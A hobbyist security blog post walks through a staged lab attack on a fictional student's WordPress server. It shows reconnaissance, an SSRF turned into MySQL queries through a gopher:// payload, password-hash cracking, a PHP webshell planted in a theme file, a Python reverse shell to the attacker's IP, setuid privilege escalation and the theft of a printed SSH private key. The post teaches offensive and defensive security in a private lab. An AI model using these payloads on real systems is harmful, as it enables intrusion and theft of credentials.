# Real Gs move in silence like lasagna


<iframe width="560" height="315" src="https://www.youtube.com/embed/c7tOAGY59uQ" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

In this article, I will introduce you to Odie's misfortunes. Odie is a final year student at ENSIBS Cyberdefense (France). 
He is also the biggest fan of the famous band: Iron Maiden. In addition to that, he built a small fan website for them on his Virtual Private Server.
Given that, Odie is a poor student, he only owns one VPS for his tests, courses and others stuff.
But, Odie comes from the most prestigious school in cyberdefense, then he knows how to protect himself against awful hackers... Well, almost.

We will see how the Odie website got attacked and we will try to find some evidence about the attack in memory. This is what we will try to see together in this article.

First of all, I'm not an expert whether in red or blue team, not at all. The goal of this little practical exercises is learning new things and try to improve my skill in pentest and incident response. If you got any comments, feel free to contact me! :D


![](https://media.giphy.com/media/lCy03imiDRmzC/giphy.gif)


Thanks to [SIben](https://twitter.com/_SIben_) for helping me when I was trying to find a name for this article!

__UPDATE 1 XX/XX/XXXX__: [Arnaud ZOBEC](https://twitter.com/AZobec) told me that I could have done a timeline of the attacked system before RAM dump extraction. In order to correlate file schedule.

__UPDATE 2 XX/XX/XXXX__: [Fabian RODES](https://twitter.com/FabianRODES) advised me to detail a little more the "Action plan" part with:

* SSH configuration hardening
* PHP configuration and Apache2 hardening (+ ModSecurity)
* WordPress hardening (configuration + iTheme Security plugin)
* Installing a reverse proxy and possibly blocking via geoip 
* Installing fail2ban on SSH and Apache2

__UPDATE 3 XX/XX/XXXX__: [Laluka](https://twitter.com/TheLaluka) told me it would be nice to add some stuff like the arbitrary PHP code.

# Setting up the environment

Before attacking the server, here are its specifications:

* Debian 9
* Apache2 server
* MariaDB
* PHP 7

I will share with you the Linux commands that Odie made. Perhaps you will find his& choices interesting... Or not!

During Debian installation, Odie only installed SSH server. When the system is properly installed, Odie did updates/upgrades and put his user in `sudo` group, more convenient.

```bash
$ su root 
# apt update
# apt upgrade
# apt install sudo vim curl python python-pip
# usermod -aG sudo odie
# reboot
```

Now, comes the time to install and set up the web server, database and PHP for the future WordPress:

```bash
$ sudo apt install mariadb-client mariadb-server
$ sudo su
# mysql_secure_installation
MySQL root password: mysqlroot
Remove anonymous users: Y
Disallow root login remotely: Y
Remove test database and access to it: Y
Reload priv: Y

# mysql
MariaDB [(none)]> create database wp_db;
Query OK, 1 row affected (0.00 sec)

MariaDB [(none)]> CREATE USER 'wp_mysql_user'@'localhost' IDENTIFIED BY '';
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.* to 'wp_mysql_user'@'localhost';
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> quit
Bye

# sudo apt install php7.0 php7.0-mysql apache2 libapache2-mod-php7.0

$ echo "<?php echo 'bite de poulet'; ?>" > test.php
$ curl 127.0.0.1/test.php
bite de poulet
``` 

As Odie has been computer science security courses, he takes great care to run `mysql_secure_installation` to set a password on MySQL __root__ user, remove useless data, and disable remote connection for the __root__ user. 

In addition, he knows that it's a bad habit to work with the __root__ user. Then he created a specific MySQL user for his WordPress: __wp_mysql_user__. 

Talking about WordPress, Odie installed it like that:

```bash
$ cd /var/www/html 
$ wget https://wordpress.org/latest.tar.gz
$ file latest.tar.gz 
latest.tar.gz: gzip compressed data, last modified: Wed Dec 19 23:24:07 2018, from Unix
$ tar xvfz latest.tar.gz
$ mv wordpress/* .
$ sudo chown -R www-data:www-data /var/www/html
$ sudo find /var/www/html -type d -exec chmod 755 {} \;
$ sudo find /var/www/html -type f -exec chmod 644 {} \;
$ sudo rm index.html
```

Rights are well assigned, we have `755` on all folders, `644` on files and the owner of everything in `/var/www/html` folder is __www-data__. Everything is going well!

After four clicks, the WordPress is finally installed. Odie doesn't like to bother too much, he didn't have his keepass with him so he put a temporary weak password for the admin account. He thought he is going to change it later.

Then, Odie installed `docker`. It's more convenient for little tests and setting up small architecture. Here is his configuration:

```bash
$ sudo apt-get install \
     apt-transport-https \
     ca-certificates \
     curl \
     gnupg2 \
     software-properties-common

$ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -

$ sudo add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/debian \
   $(lsb_release -cs) \
   stable"

$ sudo apt-get update && sudo apt-get install docker-ce

$ sudo usermod -aG docker odie
```

Now that everything is installed, he decided to customize his website with a more rock'n'roll theme. 


![](/lib/images/articles/realgsmoveinsilencelikelasagna/env_1.png)


After that, Odie go back to his business. He got some work to do for his school. Hurry! It's the last year, he shouldn't miss it! 

# Red team time

A few days/weeks have passed since Odie put his website online. A clever student from a competing school fell on Odie's website. This student knows that the site belongs to Odie. This little gangster wants to hack the website and steal all ENSIBS courses!


![](https://media.giphy.com/media/hZWCe6lD1oVTq/giphy.gif)


## Fingerprinting

This step will allow the attacker to get an accurate idea of the targeted information system. This will allow him to develop some advanced attacks against the server and get access or confidential data.

### WordPress

As the attacker, we know there is a website, a WordPress. There are some small interesting features on this kind of CMS, such as user enumeration:

> http://192.168.122.147/?author=1

The above URL redirects us to:

> http://192.168.122.147/index.php/author/eddiethehead/

We know the first user of this WordPress: `eddiethehead`.

Haax did a great article about "vulnerabilities" or dangerous features on WordPress, and he presents how to prevent them: https://haax.fr/en/articles/best-security-practice-wordpress-installation/

At least, the WordPress is up to date. `Wappalyzer` is a Firefox plugins which display versions of solutions used in the visited website.


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_1.png)


### Nmap

The next scan is not very stealthy, even not at all. It's red team but not too much red team... :')

```nmap
host $ sudo nmap -p- -sS -sV -O -oA nmap 192.168.122.147

Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-27 03:51 UTC
Nmap scan report for 192.168.122.147
Host is up (0.00024s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
MAC Address: 52:54:00:64:C8:8F (QEMU virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.67 seconds
```

This scan will test all TCP ports of the machine (from 1 to 65535) and will try to determine the services and associated versions. Finally, I export these reports in gnmap, nmap and xml format. 

Pro tip: to make easier large nmap scans reading:

```bash
host $ xsltproc nmap.xml > nmap.html
```

This tool will convert the XML file to an HTML file similar to:


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_2.png)


### Bruteforce?

We could try to brute-force the SSH with __eddiethehead__ or __oddie__ as username, but that wouldn't be very discreet. So we're going to try something much more quiet: brute-force the files at the root with `DirBuster`.
Yes I know, it's not quiet, but well, I'm sure Odie won't see his logs.... At least for the moment.


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_3.png)


We use 40 threads because, well, I have already generated logs, then let's continue in that way. I will use the "medium" wordlist provided with DirBuster, which never really disappointed me. 

And finally, we will only look for PHP and text files in the root folder, without being recursive.  If there are no new hypotheses at the end of this first brute force, then maybe I will dig deeper. But for the moment, there are no advantages in being recursive.

After only 8500 requests, a file got my attention: `test.php`. It is not a default WordPress file:


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_4.png)


Let's take a look at it:


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_5.png)


## Exploitation

A file checker, let's see what happens if I query for `maki.bzh` (totally random choice obviously :D).


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_6.png)


We can only test local files. Let's try with the `index.php` file:


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_7.png)


Hmmm... It includes the webpage, we might think there is a file inclusion somewhere!

### LFI, RCE or SSRF?

Indeed, we can think of a Local File Inclusion, a Remote Command Execution or Server Side Request Forgery... But thanks to the output verbosity, we assume this script is using `curl`:


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_8.png)


Let's try to change the protocol used, something like `file://` instead of `http://`. If we don't miss the localhost condition, it should work:

> file://localhost/etc/passwd


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_9.png)


This application allows us to include arbitrary file, great. By the way, there is a user called __odie__ on the system. I will display the content of `test.php`, just to be clear about the vulnerability:

> file://localhost/var/www/html/test.php

```php
<?php 
include_once "config_test.php";
?>

<html>
<head>
	<title>Super curling</title>
</head>
<body>
	<form action="test.php" method="post">
		URL Checker - Beta: 
		<input type="text" name='url' />		
	</form>
<?php
if (isset($_POST['url'])&&!empty($_POST['url']))
{
		$url = $_POST['url'];
			$content_url = getUrlContent($url);
}
else
{
		$content_url = "";
}

if(isset($_GET['debug']))
{
		show_source(__FILE__);
}
?> 
</body>
</html>
```

Same operation to get the `config_test.php` content:

> file://localhost/var/www/html/config_test.php

```php
<?php
function safe($url)
{
	$tmpurl = parse_url($url, PHP_URL_HOST);
	if($tmpurl != "localhost" and $tmpurl != "127.0.0.1")
	{
		var_dump($tmpurl);
		die("<h1>Only access to localhost</h1>");
	}
	return $url;
}

function getUrlContent($url){
	$url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl -v ".$url;
	echo $pl;
	$content = shell_exec($pl);
	echo $content;
	return $content;
}
?>
```

No more doubt, we got an SSRF in front of us. The RCE is not possible because of `escapeshellarg();` function in PHP.

### Server Side Request Forgery

So now that I know there is an SSRF, we have to find a compatible service to interact with the system. There is a WordPress installed, then we can think that MySQL is being used. Let's try to get the configuration file from the CMS:

> file://localhost/var/www/html/wp-config.php

```php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wp_db');

/** MySQL database username */
define('DB_USER', 'wp_mysql_user');

/** MySQL database password */
define('DB_PASSWORD', '');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         ')Rd+$da6g*B/tnJv#L[l$Ms3O+;YGx5(;fd$%eA16&Tc;6Gh|!nnrv23K1B>/=C?');
define('SECURE_AUTH_KEY',  'x8K1X9U?.Kf!sxlL0Mt6&5 -wa,`>HjBhp,j@LWyIIcwW#U)`m.C(6{v)EKfl|!<');
define('LOGGED_IN_KEY',    '~ZW7f:RWz,6s?fXB=EqZ/$j.d]@d^{l=q1SnCySLm,$]9Y9B>lq n?]S>10=F`9c');
define('NONCE_KEY',        '@rs_~hBZ2 ;~A6/eH7C&Q@JB}Af$IF=N5_CbuXq?DT|_n{TsFq|_g}[I<)juXM=i');
define('AUTH_SALT',        'SbuXoB.8TYTm`%WEKRN/9Me8O9C>]K((y}s/3~IwpMBTrI6(&JiD0<nuf[huStMI');
define('SECURE_AUTH_SALT', 'w(wnD$yjnc@z6]Kal{.=Kv~G5{u$j=ZnKaN,#`Dl7xbS_(3OVi~w]0.Hk;wQ#lbB');
define('LOGGED_IN_SALT',   '-1.h]p gm?rf1?6byNfAbK:VJ}3x&dx2Gf-QS%a</GHh8t{to1T5a~lQ=408,PyM');
define('NONCE_SALT',       '4v6W.P-H:4}wJdOo9XNtO0_eCp e9xpSi4m5Q6<htwNo`JKynG2iq8A}[VCh[&eS');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
 
</body>
</html>
```

There are some interesting things to notice:

* MySQL is used ;
* There is no password on the MySQL user __wp_mysql_user__ ;
* The database name is `wp_db`.

There are many articles on the internet about SSRF exploitation with MySQL. Let's see how I can take advantage of this.

### SSRF to SQL injection

On my laptop, I installed MySQL (MariaDB), created a database called `wp_db`, created a user called `wp_mysql_user` without authentication password, downloaded and install WordPress:

```bash
host $ mysql -u root -p 
MariaDB > create database wp_db;
MariaDB > CREATE USER 'wp_mysql_user'@'localhost' IDENTIFIED BY '';
MariaDB > GRANT ALL PRIVILEGES ON *.* to 'wp_mysql_user'@'localhost';
```

Once my personal environment is similar to the target one, here is my MySQL request to get the Wordpress credentials:

```bash
host $ mysql -u wp_mysql_user
MariaDB [(none)]> select user_login,user_pass from wp_db.wp_users;
+--------------+------------------------------------+
| user_login   | user_pass                          |
+--------------+------------------------------------+
| test_user    | SomeWordpressHash                  |
+--------------+------------------------------------+
1 row in set (0.00 sec)

host $ mysql -h localhost -u wp_mysql_user -e "select user_login,user_pass from wp_db.wp_users;"
+--------------+------------------------------------+
| user_login   | user_pass                          |
+--------------+------------------------------------+
| test_user    | SomeWordpressHash                  |
+--------------+------------------------------------+
```

The second request is just a one liner specifying that it is necessary to go through the localhost.

To execute SQL commands, I will need to look at the query in Wireshark and understand which data is sent and how. The following article will probably explain this better than me: https://paper.seebug.org/510/

The mentioned article shows us how to simulate the MySQL request in a local environment, retrieve data transmitted and replay them. This means that MariaDB has no specific protection against regame or authenticity.


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_10.gif)


Displayed bytes at the end of the above GIF will be used as payload to get the username and hashed password from the WordPress database. With a little python script, stolen to our asian friends, I will be able to generate the complete payload:

```python
#!/usr/bin/python2

def result(s):
  a = [s[i:i+2] for i in xrange(0, len(s), 2)]
  return "gopher://127.0.0.1:3306/_%" + "%".join(a)

if __name__ == "__main__":
  import sys
  s = sys.argv[1]
print result(s)
```

In fact, this python script will just add `gopher://127.0.0.1:3306/_` in front of our payload and add a `%` every two characters. Otherwise, the web server will not take the data as hex data.

```bash
host $ cat ssrf_mysql2 | xxd -p | tr -d '\n'
ac00000185a23f000000000121000000000000000000000000000000000000000000000077705f6d7973716c5f7573657200006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404393230360f5f636c69656e745f76657273696f6e0731302e312e3337095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c300000000373656c65637420757365725f6c6f67696e2c757365725f706173732066726f6d2077705f64622e77705f75736572730100000001

host $ ./parse.py ac00000185a23f000000000121000000000000000000000000000000000000000000000077705f6d7973716c5f7573657200006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404393230360f5f636c69656e745f76657273696f6e0731302e312e3337095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c300000000373656c65637420757365725f6c6f67696e2c757365725f706173732066726f6d2077705f64622e77705f75736572730100000001
gopher://127.0.0.1:3306/_%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%77%70%5f%6d%79%73%71%6c%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%39%32%30%36%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%07%31%30%2e%31%2e%33%37%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%30%00%00%00%03%73%65%6c%65%63%74%20%75%73%65%72%5f%6c%6f%67%69%6e%2c%75%73%65%72%5f%70%61%73%73%20%66%72%6f%6d%20%77%70%5f%64%62%2e%77%70%5f%75%73%65%72%73%01%00%00%00%01
```

By filling the "URL" input of `test.php` with our ugly payload, there is a nice return in front of our eyes: 


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_11.png)



Credentials stored in the database are:

| username | hash |
|----------|------|
|eddiethehead | $P$Bi423VbUyNs7iWzYNNDqPBdisIiL.D0|

### Offline bruteforce

Having a hash, we can try to break it, testing all the possibilities. If it doesn't work, I can try to upload a webshell via our SSRF

```bash
host $ echo "$P$Bi423VbUyNs7iWzYNNDqPBdisIiL.D0" > hash 
host $ john hash --wordlist=rockyou.txt 
```

Nothing relevant after few minutes. Odie put a strong password or the password is not in the rockyou wordlist.

`John` is able to change wordlists content following preset customization rules. Modifying `rockyou` will take to long, I decided to do my own wordlist, containing only 8 words:

```raw
eddiethehead
ironmaiden
admin
root
ensibs
test
administrator
wordpress
```

I want to maximize my chances, I decide to use all of John's customization rules:

```bash
host $ john hash --wordlist=wordlist --rule=all   

Warning: detected hash type "phpass", but the string is also recognized as "phpass-opencl"
Use the "--format=phpass-opencl" option to force loading these as that type instead
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x4x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
eddiethehead123  (?)
1g 0:00:00:00 DONE (2018-12-27 00:53) 1.298g/s 935.0p/s 935.0c/s 935.0C/s Eddiethehead46..eddiethehead7777
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Great! It worked! The hash is broken, the password is: `eddiethehead123`.

### RCE to reverse shell

It's time for me to log on the WordPress administration panel:

|username|password|
|--------|--------|
|eddiethehead|eddiethehead123|


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_12.png)


It works like a charm! Now it's time to execute commands directly on the Linux host. To do that, I just have to edit or upload a PHP page. Nowadays, it's possible to edit the current CMS theme through the web view.

> Appearences > Themes > Editor

On the right panel, we can see the "inc" folder, inside it, there are some PHP files such as `customizer.php`. I will inject arbitrary PHP code in this page:


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_13.png)


This little PHP line will runs the data sent through the "x" GET parameter. Here is an example:

```bash
host $ curl "http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=id"                                  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Perfect, it's time to execute a reverse shell. The standard method (using `netcat`) is no longer available since the "-e" argument has been removed. The `/dev/tcp/IP/PORT` trick is not always possible too.

But there are a lot of possibilities to runs a reverse shell, it works with PHP or Python for example. I will not modify the PHP pages any further, in order to avoid damaging the integrity of the site.

```bash
host $ curl "http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=which%20nc"
-> No netcat

host $ curl "http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=which%20python"
/usr/bin/python
```

Python is present on the remote target, nice. Let's go get the payload on pentestmonkey:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

I just have to replace the IP and port with mine. Here is the final payload:

```
http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.122.1",3615));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

And now, just listen on your 3615 TCP port using `netcat`:


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_14.gif)


It's possible to have a fully interactive shell from this shitty one, using Python and other trick: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

I ever presented these tricks in __Santhacklaus__ CTF writeups: https://maki.bzh//courses/blog/writeups/santhacklaus2018/#exploitation-1

But I love GIFs, so here is again :D


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_15.gif)


### From www-data to odie

There is no `sudo`, no vulnerable processes, but let's take a look about suid binaries and scripts:

```bash
rev-shell $ find / -perm -4000 | xargs grep -v "Permission denied"
Binary file /usr/lib/openssh/ssh-keysign matches
Binary file /usr/lib/policykit-1/polkit-agent-helper-1 matches
Binary file /usr/lib/dbus-1.0/dbus-daemon-launch-helper matches
Binary file /usr/lib/eject/dmcrypt-get-device matches
Binary file /usr/local/bin/ensibsproject matches
Binary file /usr/bin/chsh matches
Binary file /usr/bin/newgrp matches
Binary file /usr/bin/gpasswd matches
Binary file /usr/bin/pkexec matches
Binary file /usr/bin/chfn matches
Binary file /usr/bin/passwd matches
Binary file /usr/bin/sudo matches
Binary file /bin/umount matches
Binary file /bin/su matches
Binary file /bin/ping matches
Binary file /bin/mount matches

rev-shell $ ls -la /usr/local/bin/ensibsproject
-rwsrwsr-t 1 odie odie 8640 Dec 27 05:30 /usr/local/bin/ensibsproject
```

Olala, by chance, Odie puts sticky bit on a binary! What a chance we have!


![](https://media.giphy.com/media/l0Iy8OYsxXo4PlCIU/giphy.gif)


Ok, now, what this binary is doing:

```bash
rev-shell $ /usr/local/bin/ensibsproject

 _____           _ _                                  _    
| ____|_ __  ___(_) |__  ___   ___  ___  ___ _ __ ___| |_  
|  _| | '_ \/ __| | '_ \/ __| / __|/ _ \/ __| '__/ _ \ __| 
| |___| | | \__ \ | |_) \__ \ \__ \  __/ (__| | |  __/ |_  
|_____|_| |_|___/_|_.__/|___/_|___/\___|\___|_|  \___|\__| 
 _ __  _ __ ___ (_) ___  ___| |_                           
| '_ \| '__/ _ \| |/ _ \/ __| __|                          
| |_) | | | (_) | |  __/ (__| |_                           
| .__/|_|  \___// |\___|\___|\__|                          
|_|           |__/                                         

Traceback (most recent call last):
  File "/home/odie/project.py", line 16, in <module>
    import requests
ImportError: No module named requests

$ strings /usr/local/bin/ensibsproject | grep py                       
/home/odie/project.py

rev-shell $ cat /home/odie/project.py
#!/usr/bin/python

print """
 _____           _ _                                  _    
| ____|_ __  ___(_) |__  ___   ___  ___  ___ _ __ ___| |_  
|  _| | '_ \/ __| | '_ \/ __| / __|/ _ \/ __| '__/ _ \ __| 
| |___| | | \__ \ | |_) \__ \ \__ \  __/ (__| | |  __/ |_  
|_____|_| |_|___/_|_.__/|___/_|___/\___|\___|_|  \___|\__| 
 _ __  _ __ ___ (_) ___  ___| |_                           
| '_ \| '__/ _ \| |/ _ \/ __| __|                          
| |_) | | | (_) | |  __/ (__| |_                           
| .__/|_|  \___// |\___|\___|\__|                          
|_|           |__/                                         
"""

import requests

try:
    requests.get('http://www-ensibs.univ-ubs.fr/fr/formations/formations/diplome-d-ingenieur-DI/sciences-technologies-sante-STS/diplome-d-ingenieur-cyberdefense-program-icyb00-213.html')
    flag = 1
except:
    flag = 0

if flag:
    print "ENSIBS Cyberdefense website is up!"
```

Odie really loves his school, he even made a script for checking the disponibility of the website. Beautiful.

However, it's a python script and the binary seems to be used as a wrapper to execute this script. Fortunately, it got the sticky bit, which means that if we can execute commands through this binary, then we will have rights of __odie__ user on the system.

Environment variable `PYTHONINSPECT` will force the inspection mode. It means a python console will appear at this end of python script execution. With the binary's rights ;)

```bash
rev-shell $ PYTHONINSPECT=1 /usr/local/bin/ensibsproject                

 _____           _ _                                  _    
| ____|_ __  ___(_) |__  ___   ___  ___  ___ _ __ ___| |_  
|  _| | '_ \/ __| | '_ \/ __| / __|/ _ \/ __| '__/ _ \ __| 
| |___| | | \__ \ | |_) \__ \ \__ \  __/ (__| | |  __/ |_  
|_____|_| |_|___/_|_.__/|___/_|___/\___|\___|_|  \___|\__| 
 _ __  _ __ ___ (_) ___  ___| |_                           
| '_ \| '__/ _ \| |/ _ \/ __| __|                          
| |_) | | | (_) | |  __/ (__| |_                           
| .__/|_|  \___// |\___|\___|\__|                          
|_|           |__/                                         

Traceback (most recent call last):
  File "/home/odie/project.py", line 16, in <module>
    import requests
ImportError: No module named requests
>>> import os; os.system('/bin/bash -p')
```


![](/lib/images/articles/realgsmoveinsilencelikelasagna/red_16.gif)


The "-p" argument of bash allow conserving rights. Otherwise, we would have had a bash as __www-data__, not really interesting in our case.

Let's see if the user __odie__ got an SSH private key. It would be more convenient with a SSH shell, and more discreet.

```bash
rev-shell $ ls -la /home/odie/
total 64d
drwxr-xr-x 5 odie odie  4096 Dec 27 05:50 .
drwxr-xr-x 3 root root  4096 Dec 26 20:18 ..
-rw------- 1 odie odie  6335 Dec 27 05:37 .bash_history
-rw-r--r-- 1 odie odie   220 Dec 26 20:18 .bash_logout
-rw-r--r-- 1 odie odie  3526 Dec 26 20:18 .bashrc
drwx------ 3 odie odie  4096 Dec 27 05:09 .cache
drwx------ 4 odie odie  4096 Dec 27 05:09 .local
-rw-r--r-- 1 odie odie   675 Dec 26 20:18 .profile
drwxr-xr-x 2 odie odie  4096 Dec 27 05:46 .ssh
-rw------- 1 odie odie 10478 Dec 27 05:40 .viminfo
-rwxr-xr-x 1 odie odie   934 Dec 27 05:08 project.py

rev-shell $ cat /home/odie/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1VMOMwtecWKwr4SnW41bi7ALoelNH6mQ2s5jNlbwSa6iBCmG
aOvZZXNc6JrNZU/TMHKgigpxwt1DKWQ9UvWi3i6X/CpVgjrv3z/2VPhPO4GJU0JX
Q7NWpYv4s4ULgUhSIKxcnTvof6fxLAu9NxCGiLq6tL5ZG3naN9ITDK9MhFgrKYMH
/jTsiqdv/CkVhVK3EZHaKgqcJPxhkNInxM1S8mblPUrYQD/9rL8iq1YQyHhRddjU
zm1BT7j3vE8ukxs7VDeVgYEFS0HTRfyifQMLb+oa/GbMnoi73if9H9gVFMPdO6va
jyb5KUMB59/gheaFVEF5FWrQH3NNbnSX46SQIwIDAQABAoIBAQCbiBCkOrfC53d2
oLr8TxXdxJ7Wj6jBWvnX7f370msi7YYGjtgGi15XT0L//E2gfhC2E/zkaDUFJBkh
hooHgDwczc/V9G+foaTeGl5ZGSl7czhSUd4Z6BlWXbUX/fqjab0nQUPNB6691A5M
VMrB6PSNn8ccnGOPWso1RJ7K8sxQ+DrG3ry/xVxcq+ciyBeLrZjS4QJeybEjMEcl
/Dl6bGypH1uI7lo4/gwcmK220260JTCBa4zp3c930cw9ht4DcCcgY67no24BX4zi
SA7ZSNnOJRAMbNZU4369LxQOBYH66g0ndWLXz3FVNsch5yiMEFtcbW2jAvcCad01
+clQiBWBAoGBAOxF8Nl5OjZNsp0zRSj/WTxKur6uTQZkxSd2mA98wMhWwn0gdEtj
C2AIwEni9Lix/r0wIHc96QCScRIcn4X0+D4e9nLbdRWKAKcR3zNncPIcdR6ia8Hp
hNxowkB6E+nWqs86zq+dJvpuSCK3mi6MZAv42UtzyukPfrTieyKrlrDDAoGBAOci
nKcTLpLH6U4whb6/qOXJxvPhbcGSY67dswqrZC/iOVimHOEnho+L5zfEHsA1///i
FrZSnvhDSmzrTx2xGhejzNh7EM2fTNGgtbbTscdAfzUHEkTDpHntW0WomPQ3knLF
4kRCXQp1zRrTkoWQUrgJnNKEOq95ebFq/MBU7K0hAoGBALOKvmfz2Al153nPgQmT
aLMJMnk9qGhoYO0JEKoMKc7TJv3AkL7Mp9M1MzGyVjaXg7UuAi26jPmTTnrt50b7
DTzfeHV1ULaqZK6QRSUhwNEqUNGTqQD0u7JlpN8sJT+3kZrh3DfU2s7IyOYg0Pf4
VPpIAo90kUejL6yywdFpxJvTAoGASQL39RbsGVWo7xgIx46Hbb7lZ9iH8SOq9Wv2
yKIHTdDqSISAjucLbIDHEyiShikIqu3iOsmyib3H3swd+8Ub9ue5J5EIZ8uwWm+n
tw78E3LePAP1017xr8o4kLKHTm3XhwXXSbSk60728Uhv+lzypEv1C9LVLuTyegbP
vHmXIcECgYAE5+xbrXMXnRsxmQkKc4QB5eMZyvPHkq4CMNLrgwpr3b/MSGtZkwgS
pNyEYy/Ya2utPWzRFUPUOkDjMi4vYNvbJ8qztKTVRb6Nkj0b5ENLukBJ7fPIoA+R
Aw2IgvxFUXiq6D6Mw978b594/5tOmlwCR+JKK0pvYDeLLwg4kavcqA==
-----END RSA PRIVATE KEY-----
```

Yay! I'll be able to get a real shell!

### It's over...

```bash
host $ chmod 600 odie_priv.key 
host $ ssh -i odie_priv.key odie@192.168.122.147
odie@webserver $ id
uid=1000(odie) gid=1000(odie) groupes=1000(odie),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
```

Yeeeeeeeees! Here I am with the identity of __Odie__ on his system, I will be able to steal all ENSIBS projects! I could stop the attack here...


![](https://media.giphy.com/media/YTbZzCkRQCEJa/giphy.gif)


... Or not. In case of real red team operation, you can't surrender before being __root__ and remove all traces left behind. And when you're __root__ you're able to give a little present: a backdoor :D

